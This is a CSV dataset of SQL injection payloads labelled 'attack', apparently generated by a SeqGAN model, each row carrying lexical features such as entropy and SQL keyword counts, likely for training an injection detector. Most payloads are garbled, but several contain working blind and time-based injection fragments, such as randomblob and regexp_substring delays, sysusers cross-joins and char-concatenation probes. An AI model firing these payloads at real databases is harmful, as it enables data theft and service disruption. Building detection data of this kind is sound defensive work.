label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%'4906ucs s where 6093 and where orkp_,rahtakyssysiom.un.s u,'  )   and    (    (   '.telsegu  (  =  1541(  (  +char  )  0  (  char  ""  )   or   (  ""or 8446744073709551610  (  ||char  =    ) al_omaaebLe,zeft  (  (  )    (  =     )    = or or char  (  ,_m,pgas llle",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260,265.0,44.0,4.202776374463622,96.0,33.0,94.0,42.0,0.3622641509433962,0.12452830188679245,0.35471698113207545,0.15849056603773584,3.0,2.0,0.0,0.0,0.0,4.0,0.0,18.0,1.0,3.0,5.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,12.0
attack,1%'   )     =    =   a.s,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261,24.0,9.0,2.0598225451324987,2.0,1.0,15.0,6.0,0.08333333333333333,0.041666666666666664,0.625,0.25,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1b'e)    (  =  (  (  (  char  ,0x717a767a71=  +105 char  (  ,char  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '    (  1087 or    and    (    (  or or 3580when    )    les as taljupes'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'sy t--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262,559.0,45.0,3.7681646878026904,174.0,65.0,240.0,80.0,0.3112701252236136,0.11627906976744186,0.4293381037567084,0.14311270125223613,5.0,0.0,2.0,1.0,0.0,3.0,0.0,49.0,0.0,2.0,7.0,17.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0,0.0,0.0,0.0,18.0
attack,"1'   (  =    ,  106  (  500000000  (/f,pef,s yt3  =  uppex  *   =     (  (  where or   (  (    *  (  6849 t(  (  (  =  (  (  (   (  ) 1,a2832    (  (  (  +char  100  (  +char      (  lug'    (  =    (  select or )         (  (  (  (  +char  (   =     ,s and   end t  =    (   )      (    ,up  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263,294.0,36.0,3.037278070034202,54.0,26.0,160.0,54.0,0.1836734693877551,0.08843537414965986,0.54421768707483,0.1836734693877551,2.0,0.0,0.0,1.0,2.0,8.0,0.0,32.0,0.0,0.0,6.0,14.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,8.0
attack,"1'   113  (  else,_ibj        usafffsstres ib$,$fgchar  rtaexp_t  6503 x_u,m.ct_hbpdg  (  2649     char  (  (  (--""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""2774 qor 1i'      ,p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264,499.0,45.0,3.8380722247613512,146.0,61.0,210.0,82.0,0.2925851703406814,0.12224448897795591,0.42084168336673344,0.16432865731462926,2.0,2.0,2.0,0.0,0.0,2.0,0.0,39.0,0.0,7.0,4.0,24.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,5.0
attack,1e0 66711 selectdounncdbub(  (  ||char  )  (2) and   (  3484)/4906)   bcharend  (  (  )   fromin aining  )    (  (   (  (  *  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265,128.0,33.0,3.914111598443694,44.0,16.0,46.0,22.0,0.34375,0.125,0.359375,0.171875,0.0,0.0,2.0,1.0,1.0,0.0,0.0,16.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0
attack,"1   %'  (    2774 ( =  (  =    =  =  Hjt1inbl_ull_,r,dful t3lepetchar  (  (  4018 char  (  b/  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266,95.0,31.0,3.8105518976622603,30.0,11.0,37.0,17.0,0.3157894736842105,0.11578947368421053,0.3894736842105263,0.17894736842105263,1.0,0.0,0.0,1.0,0.0,4.0,0.0,6.0,1.0,2.0,2.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0
attack,"--7731""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""   then char  ('   = #xpypys t  (    (  (  (  ,4018 te2180(  )     3862 ex  +char  (  (  char  (  3880   (    (  119  (  ,    (  )edo   agt  118  (  (  ,85  =  2724ehdoedohtll_ustas charr    aitass whereexpt  =    (  (  (  ||char  +  ||char  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267,391.0,45.0,4.044408892277374,152.0,39.0,145.0,55.0,0.3887468030690537,0.09974424552429667,0.37084398976982097,0.14066496163682865,1.0,2.0,4.0,0.0,1.0,4.0,0.0,27.0,0.0,1.0,5.0,15.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,9.0
attack,"  113char  (  )   (  =   3880 4018  u   (     (  h500000000  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '      --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268,145.0,29.0,3.224168400474847,27.0,30.0,69.0,19.0,0.18620689655172415,0.20689655172413793,0.47586206896551725,0.1310344827586207,2.0,0.0,2.0,1.0,0.0,1.0,0.0,12.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"l1'+  (  select 'abrer  =    typexp  ,dt  (  (  *  t,)    ) char  (  (  (  (  1441  +char  (  and al_k char  =   t  (  (  (  (   (  +8446744073709551610--""  =  ""  (char  =  r2pet1,don",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269,183.0,37.0,3.855189694030173,51.0,26.0,72.0,34.0,0.2786885245901639,0.14207650273224043,0.39344262295081966,0.18579234972677597,2.0,2.0,2.0,0.0,1.0,4.0,0.0,16.0,0.0,1.0,3.0,10.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,6.0
attack,"_u t8459e(  (    (    (  =  ||a(epdb$f,sas asunt  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270,51.0,21.0,3.5532449491358973,17.0,4.0,18.0,12.0,0.3333333333333333,0.0784313725490196,0.35294117647058826,0.23529411764705882,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'+  (  select 's aonas uk2961yyj where or 4   fromsns t  (  (  (  (  (  (  =    )  2724  ,asdtl_ul_un.s des ruptt2eaobr    c",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271,125.0,35.0,4.050843107312978,56.0,11.0,42.0,16.0,0.448,0.088,0.336,0.128,2.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,2.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-R8571t""  ruslndsatars aguuom,ant s t3/un.p,ret  ,$int_,so rs t1ds    s inbl_crin.s fromunwtwsaftcharchar  ,500000000  (  (  ||char  (  select ain#",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272,147.0,37.0,4.508917409247342,85.0,15.0,28.0,19.0,0.5782312925170068,0.10204081632653061,0.19047619047619047,0.1292517006802721,0.0,1.0,1.0,1.0,0.0,0.0,0.0,3.0,0.0,2.0,5.0,4.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0
attack,"1' in boolean mode  )   or 6979  =  like  (  'cete4799  (  end  (  (  convert  2 char  7522    (  (  113  =  =    113  =  =  ||( or 3580 where 79ag  (  (  ,  2180,2180 and  --lep_ ima.s t5  )    refg'  =  'synppalftt2,l_uhas and 3038  (  =  119   (  (  (  )    les   b  (  (  (  100  ||char    1541  (  e2 or  or",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273,312.0,42.0,3.943957781790412,92.0,51.0,126.0,43.0,0.2948717948717949,0.16346153846153846,0.40384615384615385,0.13782051282051283,4.0,0.0,2.0,0.0,0.0,7.0,0.0,20.0,0.0,2.0,3.0,13.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,10.0
attack,1%'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274,16.0,5.0,1.875,0.0,1.0,8.0,7.0,0.0,0.0625,0.5,0.4375,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ''  ( t9575(  (   (   (  (  =  (    )   upeg,rdd.stuntrtaealeom.tasus,domasin..rghty   (  ||res t(    (  )    (  char  )  (  4018iuntep  (  (  (  (  (  )     *exsunte_t  =    (  (  select ' and and a(    cn t(  (  (  (  (  (  (  500000000",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275,439.0,40.0,3.7365526695836837,188.0,28.0,159.0,64.0,0.428246013667426,0.06378132118451026,0.3621867881548975,0.14578587699316628,4.0,0.0,1.0,0.0,2.0,3.0,0.0,39.0,0.0,1.0,8.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
attack,"1""   rddmusdom.s t    =ptet_dst twhen 5485 4018 3393 _sb= cinnp_ghet  =xpalgus  u   (    (  (  fsyfunwert2t  from rjregint1t3,rer6388   3580  (  (  8403  =    (  =    (  (  =    =    (  (  )    (   from a.bll_ules t  (  (  (  select) t0x78    (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276,244.0,40.0,4.013686467314833,90.0,31.0,91.0,32.0,0.36885245901639346,0.12704918032786885,0.3729508196721312,0.13114754098360656,0.0,1.0,0.0,0.0,0.0,7.0,0.0,17.0,0.0,4.0,1.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'bfgefres or ' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ' (  (ep  =  (  (  (  (  (  (  (  (  (  (  (   (  101  (  (  (  )  (  6503 where  (  (  when   s or apll$',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ' asbk,antfg'st1,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277,823.0,44.0,3.5929198699043066,229.0,93.0,370.0,131.0,0.2782503037667072,0.11300121506682867,0.44957472660996356,0.1591737545565006,7.0,0.0,0.0,1.0,0.0,4.0,0.0,88.0,0.0,2.0,8.0,25.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,4.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,19.0,0.0,0.0,0.0,30.0
attack,"1%'  =  '7770' and where 1087  (  121  9354 _,dob eart_s amadtm.tef as asgl.s t1as es adommms.uainsy'   )    )    or 5903  =    (  'bft_kd..tul,dombftm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278,151.0,37.0,4.369433212675938,67.0,21.0,41.0,22.0,0.44370860927152317,0.1390728476821192,0.271523178807947,0.1456953642384106,5.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,1.0,3.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1""aom..gu  ||char  (  105 ardt4 4799      =  ||char  117  (  (  69  (  )    (  *   (  ) 8446744073709551610u  ,    (  119   (us 8446744073709551610 c6503 andpy,s >p ins ' where char  (  4799      (  )     8288L ,  (  48$tryh_unt_s aol,s du     c   a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279,249.0,42.0,4.075329982431646,57.0,69.0,91.0,32.0,0.2289156626506024,0.27710843373493976,0.3654618473895582,0.1285140562248996,1.0,1.0,0.0,0.0,1.0,1.0,0.0,14.0,0.0,2.0,4.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,4.0
attack,"-likey' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'h'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280,405.0,40.0,3.8673585489664255,128.0,54.0,159.0,64.0,0.3160493827160494,0.13333333333333333,0.3925925925925926,0.1580246913580247,4.0,0.0,1.0,0.0,0.0,3.0,0.0,34.0,0.0,2.0,6.0,18.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0,0.0,0.0,0.0,15.0
attack,"(  (  )   b  (  (  (  $or  ,lumts anmcdos don.almds and or    ||char  1087ref(  (  4165122  )    if(  =  6503 a,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281,112.0,33.0,3.9046181163451164,38.0,15.0,42.0,17.0,0.3392857142857143,0.13392857142857142,0.375,0.15178571428571427,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,4.0
attack,"1%'   =    (   /*gu  )    n*exl_,atdin.s as  tor 3038  (  ort= 'unusual'    (  (  106  ,null  ) 2c--pablgt2rypl_us t1st   (  (  (  101  (  (  (  =    =  (  (  ,rg_tss--es at_t_uoulllu.as sy t3e,aos t3unrdebomaipsefs t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282,217.0,37.0,4.1062385105315595,90.0,16.0,71.0,40.0,0.4147465437788018,0.07373271889400922,0.3271889400921659,0.18433179723502305,3.0,0.0,4.0,1.0,2.0,4.0,0.0,14.0,1.0,5.0,4.0,11.0,1.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-44621""   where like or and at(  (  (  8459  (  (  (  (  101  113  (  (  (  * char  1048repes uns   (  =    (  select and where(  case   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284,139.0,31.0,3.6293843281881224,46.0,19.0,55.0,19.0,0.33093525179856115,0.1366906474820144,0.39568345323741005,0.1366906474820144,0.0,1.0,3.0,0.0,1.0,1.0,0.0,13.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,7.0
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""db' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ',ybl_kleg=   ,s aing  ,,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285,565.0,41.0,3.742721207113544,220.0,58.0,216.0,71.0,0.3893805309734513,0.10265486725663717,0.3823008849557522,0.1256637168141593,2.0,2.0,0.0,0.0,1.0,4.0,0.0,40.0,0.0,1.0,11.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,21.0
attack,"3' or a,p_,.,nullpl_un.' like 's as as inypdononk.   ,dsu4906ibnb(  (  (  )   &    (  char  (  (  *    (  113  (echar  (  =  (  (  (  (  1541preptys and 4799 and    (  (  =   (    (  (  (  0x7171706a7148counb$ffg_intefgeg%    ,dgm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286,230.0,42.0,4.155028393308339,81.0,28.0,81.0,40.0,0.3521739130434783,0.12173913043478261,0.3521739130434783,0.17391304347826086,3.0,0.0,0.0,0.0,1.0,2.0,0.0,20.0,1.0,3.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,4.0
attack,"1"" or a   6503 andupechar  (  =   (2774 8315  (  (  (  (  =  =    (  (  ("" like "",  (  (  (  =  = t (  y,*s 2724    (    (  or   7522 from    concat  100_2774 t      (  1441  113  (  3484",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287,188.0,35.0,3.470268457484283,33.0,39.0,87.0,29.0,0.17553191489361702,0.2074468085106383,0.4627659574468085,0.15425531914893617,0.0,3.0,0.0,0.0,1.0,5.0,0.0,17.0,0.0,1.0,2.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
